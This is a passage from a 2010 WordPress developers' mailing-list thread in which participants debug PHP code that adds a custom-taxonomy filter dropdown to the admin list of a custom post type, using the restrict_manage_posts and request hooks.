	if (is_admin() && $GLOBALS['PHP_SELF'] == '/wp-admin/edit.php' && isset($request['post_type']) && $request['post_type']=='ressource_fr') {
		$request['taxonomy'] = 'classement-fr';
		$request['term'] = get_term($request['classement-fr'],'classement-fr')->name;
		unset($request['name']);
	} 
	return $request;
}

There actually may be an easier way (I really hope there is) and if so others please tell me.

-Mike


On Jul 23, 2010, at 4:24 AM, Jimmy Roy wrote:

> finally no... the result is still the same, when I click on filter : "no
> result".
> 
> Jimmy
> 
> 
> 2010/7/23 Jimmy Roy <jimmy.roy at gmail.com>
> 
>> the generated code is :
>> 
>> <select class="postform" id="cat" name="classement-fr">
>> <option selected="selected" value="0">Afficher tout</option>
>> <option value="5" class="level-0">Langue oral&nbsp;&nbsp;(4)</option>
>> <option value="6" class="level-1">&nbsp;&nbsp;&nbsp;Niveau
>> 1&nbsp;&nbsp;(2)</option>
>> <option value="7" class="level-1">&nbsp;&nbsp;&nbsp;Niveau
>> 2&nbsp;&nbsp;(1)</option>
>> <option value="8" class="level-1">&nbsp;&nbsp;&nbsp;Niveau
>> 3&nbsp;&nbsp;(1)</option>
>> </select>
>> 
>> the id is "cat", like if a regular category, so I add the name parameter
>> in wp_dropdown_categories and assign to this parameter the query_var value
>> of the custom taxonomy :
>> 
>> wp_dropdown_categories( 'show_option_all=Afficher
>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement-fr');
>> 
>> now when I click on filter... the result is always all my ressources !
>> 
>> 
>> --
>> Jimmy | www.jimmyroy.fr
>> --
>> 
>> 
>> 
>> 2010/7/23 Jimmy Roy <jimmy.roy at gmail.com>
>> 
>> thank u Mike and Scribu, I wrote a mix of your solutions :
>>> 
>>> add_action( 'restrict_manage_posts', 'my_restrict_manage_posts' );
>>> 
>>> function my_restrict_manage_posts() {
>>> global $typenow;
>>> if ($typenow=='ressource_fr')
>>> wp_dropdown_categories( 'show_option_all=Afficher
>>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr');
>>> }
>>> 
>>> but when I click on 'filter' the result is always ... "no result".
>>> 
>>> Jimmy
>>> 
>>> 
>>> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
>>> 
>>> On Jul 23, 2010, at 3:35 AM, scribu wrote:
>>>>>> Are you sure?  Unless I misunderstand what Jimmy is asking I think it
>>>> can
>>>>>> be done in the "restrict_manage_posts" hook.
>>>>> 
>>>>> Indeed. Also, he can use wp_dropdown_categories() instead of creating
>>>> the
>>>>> select manually.
>>>> 
>>>> Thanks. :)
>>>> 
>>>> No matter how hard I try, I can't keep track of every function in the
>>>> library!  Maybe the new 3.org will help.
>>>> 
>>>> -Mike
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>> 
>>> 
>>> 
>> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From jimmy.roy at gmail.com  Fri Jul 23 08:51:06 2010
From: jimmy.roy at gmail.com (Jimmy Roy)
Date: Fri, 23 Jul 2010 16:51:06 +0800
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com>
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com>
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com>
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com>
	<C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
Message-ID: <AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com>

still "no result" when I click on filter button.

I try your last code + :
function my_restrict_manage_posts() {
global $typenow;
if ($typenow=='ressource_fr')
//echo get_taxonomy_html_select( 'classement_fr' );
wp_dropdown_categories( 'show_option_all=Afficher
tout&show_count=1&hierarchical=1&taxonomy=classement_fr');
//wp_dropdown_categories( 'show_option_all=Afficher
tout&show_count=1&hierarchical=1&taxonomy=classement_fr');
}

and + :
function my_restrict_manage_posts() {
global $typenow;
if ($typenow=='ressource_fr')
//echo get_taxonomy_html_select( 'classement_fr' );
wp_dropdown_categories( 'show_option_all=Afficher
tout&show_count=1&hierarchical=1&taxonomy=classement_fr');
//wp_dropdown_categories( 'show_option_all=Afficher
tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement-fr');
}

--
Jimmy | www.jimmyroy.fr
--



2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>

> Sorry, I forgot there's something else needed in your use-case.  Try adding
> this (I think it will work):
>
> add_action( 'request', 'my_request' );
> function my_request($request) {
>        if (is_admin() && $GLOBALS['PHP_SELF'] == '/wp-admin/edit.php' &&
> isset($request['post_type']) && $request['post_type']=='ressource_fr') {
>                $request['taxonomy'] = 'classement-fr';
>                $request['term'] =
> get_term($request['classement-fr'],'classement-fr')->name;
>                unset($request['name']);
>        }
>        return $request;
> }
>
> There actually may be an easier way (I really hope there is) and if so
> others please tell me.
>
> -Mike
>
>
> On Jul 23, 2010, at 4:24 AM, Jimmy Roy wrote:
>
> > finally no... the result is still the same, when I click on filter : "no
> > result".
> >
> > Jimmy
> >
> >
> > 2010/7/23 Jimmy Roy <jimmy.roy at gmail.com>
> >
> >> the generated code is :
> >>
> >> <select class="postform" id="cat" name="classement-fr">
> >> <option selected="selected" value="0">Afficher tout</option>
> >> <option value="5" class="level-0">Langue oral&nbsp;&nbsp;(4)</option>
> >> <option value="6" class="level-1">&nbsp;&nbsp;&nbsp;Niveau
> >> 1&nbsp;&nbsp;(2)</option>
> >> <option value="7" class="level-1">&nbsp;&nbsp;&nbsp;Niveau
> >> 2&nbsp;&nbsp;(1)</option>
> >> <option value="8" class="level-1">&nbsp;&nbsp;&nbsp;Niveau
> >> 3&nbsp;&nbsp;(1)</option>
> >> </select>
> >>
> >> the id is "cat", like if a regular category, so I add the name parameter
> >> in wp_dropdown_categories and assign to this parameter the query_var
> value
> >> of the custom taxonomy :
> >>
> >> wp_dropdown_categories( 'show_option_all=Afficher
> >>
> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement-fr');
> >>
> >> now when I click on filter... the result is always all my ressources !
> >>
> >>
> >> --
> >> Jimmy | www.jimmyroy.fr
> >> --
> >>
> >>
> >>
> >> 2010/7/23 Jimmy Roy <jimmy.roy at gmail.com>
> >>
> >> thank u Mike and Scribu, I wrote a mix of your solutions :
> >>>
> >>> add_action( 'restrict_manage_posts', 'my_restrict_manage_posts' );
> >>>
> >>> function my_restrict_manage_posts() {
> >>> global $typenow;
> >>> if ($typenow=='ressource_fr')
> >>> wp_dropdown_categories( 'show_option_all=Afficher
> >>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr');
> >>> }
> >>>
> >>> but when I click on 'filter' the result is always ... "no result".
> >>>
> >>> Jimmy
> >>>
> >>>
> >>> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
> >>>
> >>> On Jul 23, 2010, at 3:35 AM, scribu wrote:
> >>>>>> Are you sure?  Unless I misunderstand what Jimmy is asking I think
> it
> >>>> can
> >>>>>> be done in the "restrict_manage_posts" hook.
> >>>>>
> >>>>> Indeed. Also, he can use wp_dropdown_categories() instead of creating
> >>>> the
> >>>>> select manually.
> >>>>
> >>>> Thanks. :)
> >>>>
> >>>> No matter how hard I try, I can't keep track of every function in the
> >>>> library!  Maybe the new 3.org will help.
> >>>>
> >>>> -Mike
> >>>> _______________________________________________
> >>>> wp-hackers mailing list
> >>>> wp-hackers at lists.automattic.com
> >>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>>>
> >>>
> >>>
> >>
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jimmy.roy at gmail.com  Fri Jul 23 08:52:30 2010
From: jimmy.roy at gmail.com (Jimmy Roy)
Date: Fri, 23 Jul 2010 16:52:30 +0800
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com>
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com>
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com>
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com>
	<C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
	<AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com>
Message-ID: <AANLkTikpZH5yx6cpTLuCXpw=imHGMeWkcZgXEfSnc2YW@mail.gmail.com>

may it will help, this is the code to define my custom taxonomy :

function register_profperso_taxonomies() {

register_taxonomy(
'classement_fr',
array( 'ressource_fr' ),
array(
'public' => true,
'hierarchical' => true,
'labels' => array(
'name' => __( 'Classements FR' ),
'singular_name' => __( 'Classement FR' )
),
'query_var' => 'classement-fr',
        'rewrite' => array( 'slug' => 'cours-fr' ),
)
);

--
Jimmy | www.jimmyroy.fr
--



2010/7/23 Jimmy Roy <jimmy.roy at gmail.com>

> still "no result" when I click on filter button.
>
> I try your last code + :
> function my_restrict_manage_posts() {
> global $typenow;
>  if ($typenow=='ressource_fr')
> //echo get_taxonomy_html_select( 'classement_fr' );
>  wp_dropdown_categories( 'show_option_all=Afficher
> tout&show_count=1&hierarchical=1&taxonomy=classement_fr');
> //wp_dropdown_categories( 'show_option_all=Afficher
> tout&show_count=1&hierarchical=1&taxonomy=classement_fr');
> }
>
> and + :
> function my_restrict_manage_posts() {
> global $typenow;
> if ($typenow=='ressource_fr')
>  //echo get_taxonomy_html_select( 'classement_fr' );
> wp_dropdown_categories( 'show_option_all=Afficher
> tout&show_count=1&hierarchical=1&taxonomy=classement_fr');
>  //wp_dropdown_categories( 'show_option_all=Afficher
> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement-fr');
> }
>
> --
> Jimmy | www.jimmyroy.fr
> --
>
>
>
> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
>
>> Sorry, I forgot there's something else needed in your use-case.  Try
>> adding this (I think it will work):
>>
>> add_action( 'request', 'my_request' );
>> function my_request($request) {
>>        if (is_admin() && $GLOBALS['PHP_SELF'] == '/wp-admin/edit.php' &&
>> isset($request['post_type']) && $request['post_type']=='ressource_fr') {
>>                $request['taxonomy'] = 'classement-fr';
>>                $request['term'] =
>> get_term($request['classement-fr'],'classement-fr')->name;
>>                unset($request['name']);
>>        }
>>        return $request;
>> }
>>
>> There actually may be an easier way (I really hope there is) and if so
>> others please tell me.
>>
>> -Mike
>>
>>
>> On Jul 23, 2010, at 4:24 AM, Jimmy Roy wrote:
>>
>> > finally no... the result is still the same, when I click on filter : "no
>> > result".
>> >
>> > Jimmy
>> >
>> >
>> > 2010/7/23 Jimmy Roy <jimmy.roy at gmail.com>
>> >
>> >> the generated code is :
>> >>
>> >> <select class="postform" id="cat" name="classement-fr">
>> >> <option selected="selected" value="0">Afficher tout</option>
>> >> <option value="5" class="level-0">Langue oral&nbsp;&nbsp;(4)</option>
>> >> <option value="6" class="level-1">&nbsp;&nbsp;&nbsp;Niveau
>> >> 1&nbsp;&nbsp;(2)</option>
>> >> <option value="7" class="level-1">&nbsp;&nbsp;&nbsp;Niveau
>> >> 2&nbsp;&nbsp;(1)</option>
>> >> <option value="8" class="level-1">&nbsp;&nbsp;&nbsp;Niveau
>> >> 3&nbsp;&nbsp;(1)</option>
>> >> </select>
>> >>
>> >> the id is "cat", like if a regular category, so I add the name
>> parameter
>> >> in wp_dropdown_categories and assign to this parameter the query_var
>> value
>> >> of the custom taxonomy :
>> >>
>> >> wp_dropdown_categories( 'show_option_all=Afficher
>> >>
>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement-fr');
>> >>
>> >> now when I click on filter... the result is always all my ressources !
>> >>
>> >>
>> >> --
>> >> Jimmy | www.jimmyroy.fr
>> >> --
>> >>
>> >>
>> >>
>> >> 2010/7/23 Jimmy Roy <jimmy.roy at gmail.com>
>> >>
>> >> thank u Mike and Scribu, I wrote a mix of your solutions :
>> >>>
>> >>> add_action( 'restrict_manage_posts', 'my_restrict_manage_posts' );
>> >>>
>> >>> function my_restrict_manage_posts() {
>> >>> global $typenow;
>> >>> if ($typenow=='ressource_fr')
>> >>> wp_dropdown_categories( 'show_option_all=Afficher
>> >>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr');
>> >>> }
>> >>>
>> >>> but when I click on 'filter' the result is always ... "no result".
>> >>>
>> >>> Jimmy
>> >>>
>> >>>
>> >>> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
>> >>>
>> >>> On Jul 23, 2010, at 3:35 AM, scribu wrote:
>> >>>>>> Are you sure?  Unless I misunderstand what Jimmy is asking I think
>> it
>> >>>> can
>> >>>>>> be done in the "restrict_manage_posts" hook.
>> >>>>>
>> >>>>> Indeed. Also, he can use wp_dropdown_categories() instead of
>> creating
>> >>>> the
>> >>>>> select manually.
>> >>>>
>> >>>> Thanks. :)
>> >>>>
>> >>>> No matter how hard I try, I can't keep track of every function in the
>> >>>> library!  Maybe the new 3.org will help.
>> >>>>
>> >>>> -Mike
>> >>>> _______________________________________________
>> >>>> wp-hackers mailing list
>> >>>> wp-hackers at lists.automattic.com
>> >>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >>>>
>> >>>
>> >>>
>> >>
>> > _______________________________________________
>> > wp-hackers mailing list
>> > wp-hackers at lists.automattic.com
>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>

From mikeschinkel at newclarity.net  Fri Jul 23 09:24:34 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 23 Jul 2010 05:24:34 -0400
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <AANLkTikpZH5yx6cpTLuCXpw=imHGMeWkcZgXEfSnc2YW@mail.gmail.com>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com>
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com>
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com>
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com>
	<C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
	<AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com>
	<AANLkTikpZH5yx6cpTLuCXpw=imHGMeWkcZgXEfSnc2YW@mail.gmail.com>
Message-ID: <6EAFDBD0-2AD1-43A7-AB89-17B288E9A6C8@newclarity.net>

Why were you inconsistent?  'classement_fr' vs. 'classement-fr'?  That just ensure you are going to generate confusion and make things harder on yourself.

Try:

function request($request) {
	if (isset($request['post_type']) && $request['post_type']=='ressource_fr') {
		$request['taxonomy'] = 'classement_fr';
		$request['term'] = get_term($request['classement-fr'],'classement_fr')->name;
		unset($request['name']);
	} 
	return $request;
}

-Mike

On Jul 23, 2010, at 4:52 AM, Jimmy Roy wrote:

> may it will help, this is the code to define my custom taxonomy :
> 
> function register_profperso_taxonomies() {
> 
> register_taxonomy(
> 'classement_fr',
> array( 'ressource_fr' ),
> array(
> 'public' => true,
> 'hierarchical' => true,
> 'labels' => array(
> 'name' => __( 'Classements FR' ),
> 'singular_name' => __( 'Classement FR' )
> ),
> 'query_var' => 'classement-fr',
>        'rewrite' => array( 'slug' => 'cours-fr' ),
> )
> );
> 
> --
> Jimmy | www.jimmyroy.fr
> --
> 
> 
> 
> 2010/7/23 Jimmy Roy <jimmy.roy at gmail.com>
> 
>> still "no result" when I click on filter button.
>> 
>> I try your last code + :
>> function my_restrict_manage_posts() {
>> global $typenow;
>> if ($typenow=='ressource_fr')
>> //echo get_taxonomy_html_select( 'classement_fr' );
>> wp_dropdown_categories( 'show_option_all=Afficher
>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr');
>> //wp_dropdown_categories( 'show_option_all=Afficher
>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr');
>> }
>> 
>> and + :
>> function my_restrict_manage_posts() {
>> global $typenow;
>> if ($typenow=='ressource_fr')
>> //echo get_taxonomy_html_select( 'classement_fr' );
>> wp_dropdown_categories( 'show_option_all=Afficher
>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr');
>> //wp_dropdown_categories( 'show_option_all=Afficher
>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement-fr');
>> }
>> 
>> --
>> Jimmy | www.jimmyroy.fr
>> --
>> 
>> 
>> 
>> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
>> 
>>> Sorry, I forgot there's something else needed in your use-case.  Try
>>> adding this (I think it will work):
>>> 
>>> add_action( 'request', 'my_request' );
>>> function my_request($request) {
>>>       if (is_admin() && $GLOBALS['PHP_SELF'] == '/wp-admin/edit.php' &&
>>> isset($request['post_type']) && $request['post_type']=='ressource_fr') {
>>>               $request['taxonomy'] = 'classement-fr';
>>>               $request['term'] =
>>> get_term($request['classement-fr'],'classement-fr')->name;
>>>               unset($request['name']);
>>>       }
>>>       return $request;
>>> }
>>> 
>>> There actually may be an easier way (I really hope there is) and if so
>>> others please tell me.
>>> 
>>> -Mike
>>> 
>>> 
>>> On Jul 23, 2010, at 4:24 AM, Jimmy Roy wrote:
>>> 
>>>> finally no... the result is still the same, when I click on filter : "no
>>>> result".
>>>> 
>>>> Jimmy
>>>> 
>>>> 
>>>> 2010/7/23 Jimmy Roy <jimmy.roy at gmail.com>
>>>> 
>>>>> the generated code is :
>>>>> 
>>>>> <select class="postform" id="cat" name="classement-fr">
>>>>> <option selected="selected" value="0">Afficher tout</option>
>>>>> <option value="5" class="level-0">Langue oral&nbsp;&nbsp;(4)</option>
>>>>> <option value="6" class="level-1">&nbsp;&nbsp;&nbsp;Niveau
>>>>> 1&nbsp;&nbsp;(2)</option>
>>>>> <option value="7" class="level-1">&nbsp;&nbsp;&nbsp;Niveau
>>>>> 2&nbsp;&nbsp;(1)</option>
>>>>> <option value="8" class="level-1">&nbsp;&nbsp;&nbsp;Niveau
>>>>> 3&nbsp;&nbsp;(1)</option>
>>>>> </select>
>>>>> 
>>>>> the id is "cat", like if a regular category, so I add the name
>>> parameter
>>>>> in wp_dropdown_categories and assign to this parameter the query_var
>>> value
>>>>> of the custom taxonomy :
>>>>> 
>>>>> wp_dropdown_categories( 'show_option_all=Afficher
>>>>> 
>>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement-fr');
>>>>> 
>>>>> now when I click on filter... the result is always all my ressources !
>>>>> 
>>>>> 
>>>>> --
>>>>> Jimmy | www.jimmyroy.fr
>>>>> --
>>>>> 
>>>>> 
>>>>> 
>>>>> 2010/7/23 Jimmy Roy <jimmy.roy at gmail.com>
>>>>> 
>>>>> thank u Mike and Scribu, I wrote a mix of your solutions :
>>>>>> 
>>>>>> add_action( 'restrict_manage_posts', 'my_restrict_manage_posts' );
>>>>>> 
>>>>>> function my_restrict_manage_posts() {
>>>>>> global $typenow;
>>>>>> if ($typenow=='ressource_fr')
>>>>>> wp_dropdown_categories( 'show_option_all=Afficher
>>>>>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr');
>>>>>> }
>>>>>> 
>>>>>> but when I click on 'filter' the result is always ... "no result".
>>>>>> 
>>>>>> Jimmy
>>>>>> 
>>>>>> 
>>>>>> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
>>>>>> 
>>>>>> On Jul 23, 2010, at 3:35 AM, scribu wrote:
>>>>>>>>> Are you sure?  Unless I misunderstand what Jimmy is asking I think
>>> it
>>>>>>> can
>>>>>>>>> be done in the "restrict_manage_posts" hook.
>>>>>>>> 
>>>>>>>> Indeed. Also, he can use wp_dropdown_categories() instead of
>>> creating
>>>>>>> the
>>>>>>>> select manually.
>>>>>>> 
>>>>>>> Thanks. :)
>>>>>>> 
>>>>>>> No matter how hard I try, I can't keep track of every function in the
>>>>>>> library!  Maybe the new 3.org will help.
>>>>>>> 
>>>>>>> -Mike
>>>>>>> _______________________________________________
>>>>>>> wp-hackers mailing list
>>>>>>> wp-hackers at lists.automattic.com
>>>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>>>> 
>>>>>> 
>>>>>> 
>>>>> 
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> 
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> 
>> 
>> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From frank at bueltge.de  Fri Jul 23 09:41:33 2010
From: frank at bueltge.de (Frank Bueltge)
Date: Fri, 23 Jul 2010 11:41:33 +0200
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <6EAFDBD0-2AD1-43A7-AB89-17B288E9A6C8@newclarity.net>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com> 
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com> 
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com> 
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com> 
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com> 
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com> 
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com> 
	<C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
	<AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com> 
	<AANLkTikpZH5yx6cpTLuCXpw=imHGMeWkcZgXEfSnc2YW@mail.gmail.com> 
	<6EAFDBD0-2AD1-43A7-AB89-17B288E9A6C8@newclarity.net>
Message-ID: <AANLkTik-bFRjPgupN9soCZ3Q6FSKxks8S4fJfPdDRDht@mail.gmail.com>

Thanks Mike - works very fine!


On Fri, Jul 23, 2010 at 11:24 AM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> Why were you inconsistent? ?'classement_fr' vs. 'classement-fr'? ?That just ensure you are going to generate confusion and make things harder on yourself.
>
> Try:
>
> function request($request) {
> ? ? ? ?if (isset($request['post_type']) && $request['post_type']=='ressource_fr') {
> ? ? ? ? ? ? ? ?$request['taxonomy'] = 'classement_fr';
> ? ? ? ? ? ? ? ?$request['term'] = get_term($request['classement-fr'],'classement_fr')->name;
> ? ? ? ? ? ? ? ?unset($request['name']);
> ? ? ? ?}
> ? ? ? ?return $request;
> }
>
> -Mike
>
> On Jul 23, 2010, at 4:52 AM, Jimmy Roy wrote:
>
>> may it will help, this is the code to define my custom taxonomy :
>>
>> function register_profperso_taxonomies() {
>>
>> register_taxonomy(
>> 'classement_fr',
>> array( 'ressource_fr' ),
>> array(
>> 'public' => true,
>> 'hierarchical' => true,
>> 'labels' => array(
>> 'name' => __( 'Classements FR' ),
>> 'singular_name' => __( 'Classement FR' )
>> ),
>> 'query_var' => 'classement-fr',
>> ? ? ? ?'rewrite' => array( 'slug' => 'cours-fr' ),
>> )
>> );
>>
>> --
>> Jimmy | www.jimmyroy.fr
>> --
>>
>>
>>
>> 2010/7/23 Jimmy Roy <jimmy.roy at gmail.com>
>>
>>> still "no result" when I click on filter button.
>>>
>>> I try your last code + :
>>> function my_restrict_manage_posts() {
>>> global $typenow;
>>> if ($typenow=='ressource_fr')
>>> //echo get_taxonomy_html_select( 'classement_fr' );
>>> wp_dropdown_categories( 'show_option_all=Afficher
>>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr');
>>> //wp_dropdown_categories( 'show_option_all=Afficher
>>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr');
>>> }
>>>
>>> and + :
>>> function my_restrict_manage_posts() {
>>> global $typenow;
>>> if ($typenow=='ressource_fr')
>>> //echo get_taxonomy_html_select( 'classement_fr' );
>>> wp_dropdown_categories( 'show_option_all=Afficher
>>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr');
>>> //wp_dropdown_categories( 'show_option_all=Afficher
>>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement-fr');
>>> }
>>>
>>> --
>>> Jimmy | www.jimmyroy.fr
>>> --
>>>
>>>
>>>
>>> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
>>>
>>>> Sorry, I forgot there's something else needed in your use-case. ?Try
>>>> adding this (I think it will work):
>>>>
>>>> add_action( 'request', 'my_request' );
>>>> function my_request($request) {
>>>> ? ? ? if (is_admin() && $GLOBALS['PHP_SELF'] == '/wp-admin/edit.php' &&
>>>> isset($request['post_type']) && $request['post_type']=='ressource_fr') {
>>>> ? ? ? ? ? ? ? $request['taxonomy'] = 'classement-fr';
>>>> ? ? ? ? ? ? ? $request['term'] =
>>>> get_term($request['classement-fr'],'classement-fr')->name;
>>>> ? ? ? ? ? ? ? unset($request['name']);
>>>> ? ? ? }
>>>> ? ? ? return $request;
>>>> }
>>>>
>>>> There actually may be an easier way (I really hope there is) and if so
>>>> others please tell me.
>>>>
>>>> -Mike
>>>>
>>>>
>>>> On Jul 23, 2010, at 4:24 AM, Jimmy Roy wrote:
>>>>
>>>>> finally no... the result is still the same, when I click on filter : "no
>>>>> result".
>>>>>
>>>>> Jimmy
>>>>>
>>>>>
>>>>> 2010/7/23 Jimmy Roy <jimmy.roy at gmail.com>
>>>>>
>>>>>> the generated code is :
>>>>>>
>>>>>> <select class="postform" id="cat" name="classement-fr">
>>>>>> <option selected="selected" value="0">Afficher tout</option>
>>>>>> <option value="5" class="level-0">Langue oral&nbsp;&nbsp;(4)</option>
>>>>>> <option value="6" class="level-1">&nbsp;&nbsp;&nbsp;Niveau
>>>>>> 1&nbsp;&nbsp;(2)</option>
>>>>>> <option value="7" class="level-1">&nbsp;&nbsp;&nbsp;Niveau
>>>>>> 2&nbsp;&nbsp;(1)</option>
>>>>>> <option value="8" class="level-1">&nbsp;&nbsp;&nbsp;Niveau
>>>>>> 3&nbsp;&nbsp;(1)</option>
>>>>>> </select>
>>>>>>
>>>>>> the id is "cat", like if a regular category, so I add the name
>>>> parameter
>>>>>> in wp_dropdown_categories and assign to this parameter the query_var
>>>> value
>>>>>> of the custom taxonomy :
>>>>>>
>>>>>> wp_dropdown_categories( 'show_option_all=Afficher
>>>>>>
>>>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement-fr');
>>>>>>
>>>>>> now when I click on filter... the result is always all my ressources !
>>>>>>
>>>>>>
>>>>>> --
>>>>>> Jimmy | www.jimmyroy.fr
>>>>>> --
>>>>>>
>>>>>>
>>>>>>
>>>>>> 2010/7/23 Jimmy Roy <jimmy.roy at gmail.com>
>>>>>>
